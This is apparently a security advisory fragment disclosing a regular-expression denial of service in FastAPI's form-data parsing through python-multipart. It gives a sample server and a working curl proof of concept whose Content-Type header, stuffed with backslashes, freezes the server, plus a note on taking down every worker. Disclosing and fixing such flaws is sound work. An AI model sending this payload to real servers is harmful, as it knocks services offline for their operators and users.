After some internal research, I found that FastAPI is vulnerable to the same ReDoS under certain conditions (only when it parses Form data not JSON).</p>\n<p>Here are the details: I'm using the latest version of FastAPI (0.109.0) and the following code:</p>\n<pre><code class=\"language-Python\">from typing import Annotated\nfrom fastapi.responses import HTMLResponse\nfrom fastapi import FastAPI,Form\nfrom pydantic import BaseModel\n\nclass Item(BaseModel):\n    username: str\n\napp = FastAPI()\n\n@app.get(\"/\", response_class=HTMLResponse)\nasync def index():\n    return HTMLResponse(\"Test\", status_code=200)\n\n@app.post(\"/submit/\")\nasync def submit(username: Annotated[str, Form()]):\n    return {\"username\": username}\n\n@app.post(\"/submit_json/\")\nasync def submit_json(item: Item):\n    return {\"username\": item.username}\n</code></pre>\n<p>I'm running the above with uvicorn with the following command:</p>\n<pre><code class=\"language-console\">uvicorn server:app\n</code></pre>\n<p>Then run the following cUrl command:</p>\n<pre><code>curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8000/submit/'\n</code></pre>\n<p>You'll see the server locks up, is unable to serve anymore requests and one CPU core is pegged to 100%</p>\n<p>You can even start uvicorn with multiple workers with the --workers 4 argument and as long as you send (workers + 1) requests you'll completely DoS the FastApi server.</p>\n<p>If you try submitting Json to the /submit_json endpoint with the malicious Content-Type header you'll see it isn't vulnerable. So this only affects FastAPI when it parses Form data.</p>\n<p>Cheers</p>\n<h4 id=\"impact-1\">Impact</h4>\n<p>An attacker is able to cause a DoS on a FastApi server via a malicious Content-Type header if it parses Form data.</p>\n<h4 id=\"occurrences\">Occurrences</h4>\n<p><a href=\"https://github.com/tiangolo/fastapi/blob/d74b3b25659b42233a669f032529880de8bd6c2d/fastapi/params.py#L586\">params.py L586</a></p>\n</details>\n### References\n\n<ul>\n<li><a href=\"https://github.com/Kludex/python-multipart/security/advisories/GHSA-2jv5-9r88-3w3p\">https://github.com/Kludex/python-multipart/security/advisories/GHSA-2jv5-9r88-3w3p</a></li>\n<li><a href=\"https://github.com/Kludex/python-multipart/commit/20f0ef6b4e4caf7d69a667c54dff57fe467109a4\">https://github.com/Kludex/python-multipart/commit/20f0ef6b4e4caf7d69a667c54dff57fe467109a4</a></li>\n<li><a href=\"https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74\">https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2jv5-9r88-3w3p\">https://github.com/advisories/GHSA-2jv5-9r88-3w3p</a></li>\n</ul>\n",
